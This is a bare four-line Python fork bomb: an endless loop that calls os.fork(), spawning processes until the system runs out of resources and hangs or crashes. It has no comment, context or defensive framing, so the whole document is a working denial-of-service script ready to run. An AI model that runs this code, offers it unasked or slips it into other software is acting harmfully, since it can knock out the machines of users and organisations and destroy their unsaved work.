import os

while True:
 os.fork()
